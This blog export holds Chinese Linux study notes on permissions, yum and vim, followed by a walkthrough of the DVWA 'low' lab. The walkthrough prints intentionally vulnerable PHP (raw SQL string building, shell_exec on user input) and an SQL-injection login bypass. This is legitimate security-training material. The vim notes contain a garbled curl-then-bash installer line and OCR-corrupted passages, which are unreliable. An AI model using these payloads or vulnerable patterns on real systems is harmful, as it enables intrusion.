href="#粘滞位-好文-https-blog-csdn-net-better1914-article-details-53943081" class="headerlink" title="粘滞位[好文][https://blog.csdn.net/better1914/article/details/53943081]"></a>粘滞位[好文][<a href="https://blog.csdn.net/better1914/article/details/53943081]">https://blog.csdn.net/better1914/article/details/53943081]</a></h4><p>粘滞位（Stickybit），或粘着位。最常见的用法在目录上设置粘滞位，如此以来，只有目录内文件的所有者或者root才可以删除或移动该文件。如果不为目录设置粘滞位，任何具有该目录写和执行权限的用户都可以删除和移动其中的文件。在我们系统中，粘滞位一般用于&#x2F;tmp目录，以防止普通用户删除或移动其他用户的文件。<br>一个目录具有粘滞位，则在other的X位会表现为 t,或者T.大小写的区别在于，原来x位上有x权限，有了粘滞位则表现为t.否则，表现为T。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost /]$ ls -ld /tmp</span><br><span class="line">drwxrwxrwt. 30 root root 4096 Nov  1 04:04 /tmp</span><br></pre></td></tr></table></figure><p><em>删除用户是最好带上-r不然用户的home目录不会一起删除</em></p><h3 id="关于目录权限总结"><a href="#关于目录权限总结" class="headerlink" title="关于目录权限总结"></a>关于目录权限总结</h3><ul><li>目录的可执行权限是表示你可否在目录下执行命令。</li><li>如果目录没有-x权限，则无法对目录执行任何命令，甚至无法cd进入目,即使目录仍然有-r读权限（这个地方很容易犯错，认为有读权限就可以进入目录读取目录下的文件)</li><li>而如果目录具有-x权限，但没有-权限，则用户可以执行命令，可以cd进入目录。但由于没有目录的读权限</li><li>所以在目录下，即使可以执行ls命令，但仍然没有权限读出目录下的文档。</li></ul><h2 id="Linux软件包管理yum"><a href="#Linux软件包管理yum" class="headerlink" title="Linux软件包管理yum"></a>Linux软件包管理yum</h2><h3 id="什么时软件包"><a href="#什么时软件包" class="headerlink" title="什么时软件包"></a>什么时软件包</h3><ul><li>在Linux下安装软件,一个通常的办法是下载到程序的源代码,并进行编译,得到可执行程序.</li><li>但是这样太麻烦了，于是有些人把一些常用的软件提前编译好,做成软件包(可以理解成windows上的安装程序)放在一个服务器上,通过包管理器可以很方便的获取到这个编译好的软件包,直接进行安装.</li><li>软件包和软件包管理器,就好比”App”和”应用商店”这样的关系.</li><li>yum(Yellow dog Updater, Modified)是Linux下非常常用的一种包管理器.主要应用在Fedora, RedHat,Centos等发行版上.</li></ul><h3 id="关于rzsz"><a href="#关于rzsz" class="headerlink" title="关于rzsz"></a>关于rzsz</h3><p>这个工具用于windows机器和远端的Linux机器通过XShell传输文件.安装完毕之后可以通过拖拽的方式将文件上传过去.</p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>关于yum的所有操作必须保证主机(虚拟机)网络畅通!可以通过 ping 指令验证</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping baidu.com</span><br></pre></td></tr></table></figure><p>ping命令是一个用来进行检测网络连通性的命令，我们目前主要会用就行，如果你不知道自己的主机有没有联网，可以试试ping</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost yum.repos.d]$ ping baidu.com -c 4</span><br><span class="line">PING baidu.com (110.242.68.66) 56(84) bytes of data.</span><br><span class="line">64 bytes from 110.242.68.66 (110.242.68.66): icmp_seq=1 ttl=128 time=56.8 ms</span><br><span class="line">64 bytes from 110.242.68.66 (110.242.68.66): icmp_seq=2 ttl=128 time=56.2 ms</span><br><span class="line">64 bytes from 110.242.68.66 (110.242.68.66): icmp_seq=3 ttl=128 time=57.3 ms</span><br><span class="line">64 bytes from 110.242.68.66 (110.242.68.66): icmp_seq=4 ttl=128 time=56.1 ms</span><br><span class="line"></span><br><span class="line">--- baidu.com ping statistics ---</span><br><span class="line">4 packets transmitted, 4 received, 0% packet loss, time 3004ms</span><br><span class="line">rtt min/avg/max/mdev = 56.184/56.664/57.344/0.561 ms</span><br></pre></td></tr></table></figure><h3 id="查看软件包"><a href="#查看软件包" class="headerlink" title="查看软件包"></a>查看软件包</h3><p>通过yum list 命令可以罗列出当前一共有哪些软件包.由于包的数目可能非常之多，这里我们需要使用grep命令只筛选出我们关注的包.例如:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost yum.repos.d]$ yum list | grep lrzsz</span><br><span class="line">lrzsz.x86_64                                0.12.20-36.el7             @anaconda</span><br></pre></td></tr></table></figure><h4 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h4><ul><li>软件包名称:主版本号.次版本号.源程序发行号-软件包的发行号.主机平台.cpu架构.</li><li>“x86_64”后缀表示64位系统的安装包, “i686”后缀表示32位系统安装包.选择包时要和系统匹配.”el7”表示操作系统发行版的版本.</li><li>“el7”表示的是centos7&#x2F;redhat7. “el6”表示centos6&#x2F;redhat6.</li><li>最后一列, base 表示的是”软件源”的名称,类似于”小米应用商店”,”华为应用商店”这样的概念.</li></ul><h3 id="如何安装软件"><a href="#如何安装软件" class="headerlink" title="如何安装软件"></a>如何安装软件</h3><p>通过yum,我们可以通过很简单的一条命令完成gcc的安装.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum install lrzsz</span><br></pre></td></tr></table></figure><p>yum 会自动找到都有哪些软件包需要下载,这时候敲”y”确认安装.出现”complete”字样,说明安装完成.</p><h4 id="注意事项-2"><a href="#注意事项-2" class="headerlink" title="注意事项"></a>注意事项</h4><ul><li>安装软件时由于需要向系统目录中写入内容，一般需要会do或者切到rool账户下才能完成.</li><li>yum安装软件只能一个装完了再装另一个.正在yum安装一个软件的过程中,如果再尝试用yum安装另外-个软件, yum会报错.</li></ul><h3 id="如何卸载软件"><a href="#如何卸载软件" class="headerlink" title="如何卸载软件"></a>如何卸载软件</h3><p>仍然是一条命令:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo yum remove lrzsz</span><br></pre></td></tr></table></figure><h3 id="换源-https-blog-csdn-net-xiaojin21cen-article-details-84726193"><a href="#换源-https-blog-csdn-net-xiaojin21cen-article-details-84726193" class="headerlink" title="[换源][https://blog.csdn.net/xiaojin21cen/article/details/84726193]"></a>[换源][<a href="https://blog.csdn.net/xiaojin21cen/article/details/84726193]">https://blog.csdn.net/xiaojin21cen/article/details/84726193]</a></h3><h2 id="vim与gcc使用"><a href="#vim与gcc使用" class="headerlink" title="vim与gcc使用"></a>vim与gcc使用</h2><p><img src="https://www.runoob.com/wp-content/uploads/2015/10/vi-vim-cheat-sheet-sch.gif" alt="img"></p><h3 id="vi-x2F-vim区别"><a href="#vi-x2F-vim区别" class="headerlink" title="vi&#x2F;vim区别"></a>vi&#x2F;vim区别</h3><p>vilvim的区别简单点来说，它们都是多模式编辑器，不同的是vim是vi的升级版本，它不仅兼容vi的所有指令，而且还有一些新的特性在里面。例如语法加亮，可视化操作不仅可以在终端运行，也可以运行于x window、mac os、windows。我们课堂上，统一按照vim来进行讲解。</p><h3 id="vim基本概念"><a href="#vim基本概念" class="headerlink" title="vim基本概念"></a>vim基本概念</h3><p>课堂上我们讲解vim的三种模式(其实有好多模式，目前掌握这3种即可),分别是命令模式(command mode)、插入模式(Insert mode)和底行模式弋(last line mode)，各模式的功能区分如下:</p><ul><li>正常&#x2F;普通&#x2F;命令模式(Normal mode)</li></ul><p><em>控制屏幕光标的移动，字符、字或行的删除，移动复制某区段及进入Insert mode下，或者到last line mode</em>·</p><ul><li>插入模式(Insert mode)</li></ul><p><em>只有在Insert mode下，才可以做文字输入，按「ESC」键可回到命令行模式。该模式是我们后面用的最频繁的编辑模式。</em></p><ul><li>·末行模式(last line mode)</li></ul><p><em>文件保存或退出，也可以进行文件替换，找字符串，列出行号等操作。在命令模式下，shift+:即可进入该模式。要查看你的所有模式:打开vim，底行模式直接输入</em></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:help vim-modes</span><br></pre></td></tr></table></figure><p>我这里一共有12种模式:six BASIC modes和six ADDITIONAL modes.</p><h3 id="vim基本操作"><a href="#vim基本操作" class="headerlink" title="vim基本操作"></a>vim基本操作</h3><ul><li><p>进入vim,在系统提示符号输入vim及文件名称后，就进入vim全屏幕编辑画面;</p><ul><li>$ vim test.c</li><li>不过有一点要特别注意，就是你进入vim之后，是处于[正常模式]，你要切换到[插入模式]才能够输入文字。</li></ul></li><li><p>[正常模式]切换至[插入模式]</p><ul><li>输入a 光标后移</li><li>输入i 不变</li><li>输入o 新起一行</li><li>输入s 但会删除当前光标所在的一个元素</li></ul></li><li><p>[插入模式]切换至[正常模式]</p><ul><li>目前处于[插入模式]，就只能一直输入文字，如果发现输错了字,想用光标键往回移动，将该字删除，可以先按一下「ESC」键转到[正常模式]再删除文字。当然，也可以直接删除。</li></ul></li><li><p>[正常模式]切换至[末行模式][shift +;」，其实就是输入「:」 退出vim及保存文件,在[正常模式]下，按一下「:」冒号键进入「Last line mode],例如:</p><ul><li>: w(保存当前文件)</li><li>: wq(输入「wq」,存盘并退出vim)</li><li>:q!(输入q!,不存盘强制退出vim)</li></ul></li></ul><h3 id="vim正常模式命令集（重要）"><a href="#vim正常模式命令集（重要）" class="headerlink" title="vim正常模式命令集（重要）"></a>vim正常模式命令集（重要）</h3><ul><li><p>插入模式</p><ul><li>·按「i」切换进入插入模式「insert mode]按”井入插入模式后是从光标当前位置开始输入文件;[重<br>要]</li><li>·按「a」进入插入模式后，是从目前光标d在位置的下一个位置开始输入文字;</li><li>·按「o」进入插入模式后，是括入新的一行，从行首开始输入文字。</li></ul></li><li><p>从插入模式切换为命令模式</p><ul><li>按「ESC」键。〔[重要]</li></ul></li><li><p>移动光标</p><ul><li>vim可以直接用键盘上的光标来上下左右移动，但正规的vim是用小写英文字母[h]、 [j]、 [k] 、[l]，分别控制光标左、下、上、右移一格</li><li>按[G]:移动到文章的最后〔重要]</li><li>按[$]:移动到光标所在行的”行尾”[重要]</li><li>按[^]:移动到光标所在行的“行首”[重要]</li><li>按[w]:光标跳到下个字的开头〔重要</li><li>按[e]:光标跳到下个字的字尾</li><li>按[b]︰光标回到上个字的开头[重要]</li><li>按[#]︰光标移到该行的第#个位置，如:5l,56l</li><li>按[gg]:进入到文本开始〔[重要]</li><li>按[shift+g]︰进入文本末端</li><li>按[ctrl]+[b]︰屏幕往”后”移动一页</li><li>按[ctrl]+ [f]︰屏幕往”前“移动一页</li><li>按[ctrl]+ [u]︰屏幕往”后”移动半页·</li><li>按[ctrl] + [d]︰屏幕往”前”移动半页</li></ul></li><li><p>删除文字</p><ul><li><p>.[x] : 每按一次，删除光标所在位置的一个字符〔重要]</p></li><li><p>[#x]︰例如，[6x]表示删除光标所在位置的”后面（包含自己在内)”6个字符</p></li><li><p>.[X] 大写的X，每按一次，删除光标所在位置的“前面”一个字符</p></li><li><p>.[#X]︰例如，[20X]表示删除光标所在位置的“前面”20个字符</p></li><li><p>.[dd]:删除光标所在行[重要]</p></li><li><p>[#dd] :从光标所在行开始删除#行[重要]</p></li><li><p>[yw]︰将光标所在之处到字尾的字符复制到缓冲区中。</p></li><li><p>.[#yw]:复制#个字到缓冲区</p></li><li><p>.[yy]:复制光标所在行到缓冲区。[重要]</p></li><li><p>.[#yy」 :例如,[6yy]表示拷贝从光标所在的该行”往下数”6行文字。</p></li><li><p>[p]︰将缓冲区内的字符贴到光标所在位置。注意:所有与”y”有关的复制命令都必须与”p”配合才能完成复制与粘贴功能。[重要]</p></li></ul></li><li><p>替换</p><ul><li>[r]︰替换光标所在处的字符。</li><li>.[R ]:香交元粽所至芝媒富拿es，直到接下 [ESC]</li></ul></li><li><p>销上一次操作</p><ul><li>[u]∶如果您误执行一个命令，可以马上按下0l<br>回到上、个操作。按多次“u”可以执行多次回复。<br>[重要]</li><li>.[ctrl+r]:撤销的恢复「[重要]</li></ul></li><li><p>更改</p><ul><li>.[c]:更改光标所在处到字尾处</li><li>.[c#w]︰例如，[c3w]表示更攻个字</li></ul></li><li><p>跳至指定的行</p><ul><li>[ctrl] + [g]: 列出光标所夺行的接往号。[重要]</li><li>[#G]︰例如，[15G]，表示移动光标至文章的第15行行首。</li></ul></li></ul><h3 id="vim末行模式命令集"><a href="#vim末行模式命令集" class="headerlink" title="vim末行模式命令集"></a>vim末行模式命令集</h3><p>在使用末行模式之前，请记住先按「ESC」键确定您已经处于正常模式，再按「:」冒号即可进入末行模式。</p><ul><li>列出行号<ul><li>[set nu] :输入[set nu]后，会在文件中的每一行前面列出行号。[重要]跳到文件中的某一行</li><li>[#] :[#]号表示一个数字，在冒号后输入一个数字，再按回车键就会跳到该行了，如输入数字15，再<br>回车，就会跳到文章的第15行。</li></ul></li><li>查找字符<ul><li>[&#x2F;关键字]∶先按[&#x2F;]键，再输入您想寻找的字符，如果第一次找的关键字不是您想要的，可以一直按[n]会往后寻找到您要的关键字为止。</li><li>[?关键字]︰先按[?]键，再输入您想寻找的字符，如果第一次找的关键字不是您想要的，可以一直按[n]会往前寻找到您要的关键字为止。</li><li>问题:&#x2F;和?查找有和区别?操作实验一下</li></ul></li><li>保存文件[重要]<ul><li>.[w]:在冒号输入字母[w]就可以将文件保存起来</li></ul></li><li>离开vim[重要]<ul><li>[q]︰按[q]就是退出，如果无法离开vim，可以在「q」后跟一个[!]强制离开vim。</li><li>.[wq] :一般建议离开时，搭配[w]一起使用，这样在退出的时候还可以保存文件。</li></ul></li><li>两个桌面光标切换<ul><li>按住CTRL +两下w</li></ul></li><li>！+gcc&#x2F;man等命令<ul><li>例如！gcc test.c</li></ul></li></ul><h3 id="vim操作总结"><a href="#vim操作总结" class="headerlink" title="vim操作总结"></a>vim操作总结</h3><ul><li><p>三种模式</p><ul><li>正常模式</li><li>插入模式</li><li>底行模式</li></ul></li><li><p>vim操作</p><ul><li>打开，关闭，查看，查询，插入，删除，替换，撤销，复制等等操作。</li></ul></li></ul><h3 id="简单vim配置"><a href="#简单vim配置" class="headerlink" title="简单vim配置"></a>简单vim配置</h3><h4 id="自动配置-https-github-com-askunix-VimForCpp"><a href="#自动配置-https-github-com-askunix-VimForCpp" class="headerlink" title="[自动配置][https://github.com/askunix/VimForCpp]"></a>[自动配置][<a href="https://github.com/askunix/VimForCpp]">https://github.com/askunix/VimForCpp]</a></h4><p>保证自己联网的情况下，命令行直接运行，一键部署</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl - sLfhttps://gitee,conHGtz2222/vimForcpp/raw/master/insta1l.sh -o ./insta11.sh &amp;&amp; bash./install.sh</span><br></pre></td></tr></table></figure><h4 id="配置文件位置"><a href="#配置文件位置" class="headerlink" title="配置文件位置"></a>配置文件位置</h4><ul><li>在目录&#x2F;etcl下面，有个名为vimrc的文件，这是系统中公共的vim配置文件，对所有用户都有效。</li><li>而在每个用户的主目录下，都可以自己建立私有的配置文件，命名为: “.vimrc”。例如，&#x2F;root目录下，通常已经存在一个.vimrc文件,如果不存在，则创建之。</li><li>切换用户成为自己执行su，进入自己的主工作目录,执行cd ~</li><li>打开自己目录下的.vimrc文件，执行vim .vimrc</li></ul><h4 id="常用配置选项，用来测试"><a href="#常用配置选项，用来测试" class="headerlink" title="常用配置选项，用来测试"></a>常用配置选项，用来测试</h4><ul><li>设置语法高亮: syntax on</li><li>显示行号: set nu</li><li>设置缩进的空格数为4: set shiftwidth&#x3D;4</li></ul><h4 id="使用插件"><a href="#使用插件" class="headerlink" title="使用插件"></a>使用插件</h4><p>要配置好看的vim，原生的配置可能功能不全，可以选择安装插件来完善配置，保证用户是你要配置的用户，接下来:</p><ul><li>安装TagList插件,下载taglist_xx.zip ,解压完成，将解压出来的doc的内容放到<del>&#x2F;.vim&#x2F;doc,将解压出来的plugin下的内容拷贝到</del>l.vim&#x2F;plugin</li><li>在~&#x2F;.vimrc中添加: let Tlist_show_one_File&#x3D;1(let Tlist_Exit_on1ywindow&#x3D;1) letTlist_use_Right_window&#x3D;1</li><li>安装文件浏览器和窗口管理器插件: WinManager</li><li>下载winmanager.zip，2.x版本以上的</li><li>解压winmanager.zip，将解压出来的doc的内容放到<del>&#x2F;.vim&#x2F;doc,将解压出来的plugin下的内容拷贝到</del>&#x2F; .vim&#x2F;plugin</li><li>在~&#x2F;.vimrc中添加let g:winManagerwindowLayout&#x3D;‘FileExplorer|TagListnmap wm: wMToggle<cr></li><li>然后重启vim,打开<del>&#x2F;XXX.c或</del>&#x2F;XXX.cpp,在normal状态下输入”wm”,你将看到上图的效果。更具体移步:[点我][<a href="https://blog.csdn.net/wooin/article/details/1858917],%E5%85%B6%E4%BB%96%E6%89%8B%E5%86%8C%EF%BC%8C%E8%AF%B7%E6%89%A7%E8%A1%8Cvimtutor%E5%91%BD%E4%BB%A4%E3%80%82">https://blog.csdn.net/wooin/article/details/1858917],其他手册，请执行vimtutor命令。</a></li></ul><h3 id="vim参考资料-https-github-com-wsdjeg-vim-galore-zh-cn"><a href="#vim参考资料-https-github-com-wsdjeg-vim-galore-zh-cn" class="headerlink" title="[vim参考资料][https://github.com/wsdjeg/vim-galore-zh_cn]"></a>[vim参考资料][<a href="https://github.com/wsdjeg/vim-galore-zh_cn]">https://github.com/wsdjeg/vim-galore-zh_cn]</a></h3><h2 id="ubuntu中安装git"><a href="#ubuntu中安装git" class="headerlink" title="ubuntu中安装git"></a>ubuntu中安装git</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install git</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(base) youzipii@youzipii-virtual-machine:~$ git</span><br><span class="line">usage: git [--version] [--help] [-C &lt;path&gt;] [-c name=value]</span><br><span class="line">           [--exec-path[=&lt;path&gt;]] [--html-path] [--man-path] [--info-path]</span><br><span class="line">           [-p | --paginate | --no-pager] [--no-replace-objects] [--bare]</span><br><span class="line">           [--git-dir=&lt;path&gt;] [--work-tree=&lt;path&gt;] [--namespace=&lt;name&gt;]</span><br><span class="line">           &lt;command&gt; [&lt;args&gt;]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Linux编辑器-gcc-x2F-g-使用"><a href="#Linux编辑器-gcc-x2F-g-使用" class="headerlink" title="Linux编辑器-gcc&#x2F;g++使用"></a>Linux编辑器-gcc&#x2F;g++使用</h2>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA low</title>
      <link href="/2023/07/21/DVWA/"/>
      <url>/2023/07/21/DVWA/</url>
      
        <content type="html"><![CDATA[<h1 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h1><p><em>资料大都参考自baynk，附上前辈博客<a href="https://baynk.blog.csdn.net/">连接</a></em></p><h2 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h2><p>暴力破解</p><p><img src="https://img1.imgtp.com/2023/07/21/TTJVnQmj.png" alt="1.png"></p><h3 id="方法一：BURP（要用到一些常用密码的字典）"><a href="#方法一：BURP（要用到一些常用密码的字典）" class="headerlink" title="方法一：BURP（要用到一些常用密码的字典）"></a>方法一：BURP（要用到一些常用密码的字典）</h3><h4 id="打开代理"><a href="#打开代理" class="headerlink" title="打开代理"></a>打开代理</h4><p><img src="https://img1.imgtp.com/2023/07/21/MsL2UVvt.png" alt="2.png"></p><h4 id="输入账号，密码随便输，点击login"><a href="#输入账号，密码随便输，点击login" class="headerlink" title="输入账号，密码随便输，点击login"></a>输入账号，密码随便输，点击login</h4><p><img src="https://img1.imgtp.com/2023/07/21/R0ZISCmD.png" alt="3.png"></p><h4 id="此时BURP会抓到以下内容"><a href="#此时BURP会抓到以下内容" class="headerlink" title="此时BURP会抓到以下内容"></a>此时BURP会抓到以下内容</h4><p><img src="https://img1.imgtp.com/2023/07/21/3GXdBzXi.png" alt="4.png"></p><h4 id="发送到intruder"><a href="#发送到intruder" class="headerlink" title="发送到intruder"></a>发送到intruder</h4><p><img src="https://img1.imgtp.com/2023/07/21/EDcxZdHy.png" alt="5.png"></p><h4 id="配置好option"><a href="#配置好option" class="headerlink" title="配置好option"></a>配置好option</h4><p><img src="https://img1.imgtp.com/2023/07/21/EoNHNW08.png" alt="6.png"></p><h4 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h4><p><img src="https://img1.imgtp.com/2023/07/21/Usra4aGp.png" alt="7.png"></p><h4 id="分析内容，得到结果"><a href="#分析内容，得到结果" class="headerlink" title="分析内容，得到结果"></a>分析内容，得到结果</h4><p><img src="https://img1.imgtp.com/2023/07/21/Y5cdzZ6s.png" alt="8.png"></p><h3 id="方法二：SQL注入"><a href="#方法二：SQL注入" class="headerlink" title="方法二：SQL注入"></a>方法二：SQL注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get username</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get password</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>通过观察上面的代码可以发现在下面语句</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure><p>可以通过admin ‘#绕过</p><p><img src="https://img1.imgtp.com/2023/07/21/CJFqwv9N.png" alt="9.png"></p><h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><p>命令注入,是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。</p><p>源代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">stristr</span>( <span class="title function_ invoke__">php_uname</span>( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/php/func-string-stristr.html">PHP stristr()函数</a><br><a href="https://www.php.net/manual/zh/function.php-uname.php">PHP php_uname()函数</a><br>ping -c 4 这里的4是指设置完成要求回应的次数。</p><p><img src="https://img1.imgtp.com/2023/07/21/0F3N7LJr.png" alt="1689930000890.png"></p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>跨站请求伪造漏洞</p><p>本质就是在不知情的情况下执行请求<br>GET和POST俩种类型<br>主要是看抓包能不能抓到参数并且修改</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="title function_ invoke__">dvwaCurrentUser</span>() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ 